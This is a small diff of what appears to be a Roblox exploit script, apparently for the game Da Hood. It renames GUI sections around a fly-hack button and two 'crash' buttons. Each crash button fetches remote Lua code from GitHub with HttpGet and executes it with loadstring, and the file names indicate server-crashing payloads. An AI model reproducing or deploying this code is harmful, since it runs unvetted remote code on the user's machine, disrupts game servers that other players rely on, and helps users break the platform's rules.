@@ -52,7 +52,7 @@ wait(15.8) end
 end
 end)
 
-Section4:NewButton("Fly [X]", "flys", function()
+Section1:NewButton("Fly [X]", "flys", function()
       local plr = game.Players.LocalPlayer
         local Humanoid = plr.Character:FindFirstChildWhichIsA('Humanoid')
         local mouse = plr:GetMouse()
@@ -262,6 +262,6 @@ end)
 Section1:NewButton("Encrypt Crash", "a", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))() end)
 
-section1:NewButton ("Swagmode Crash","", function()
+Section1:NewButton ("Swagmode Crash","", function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
 end)
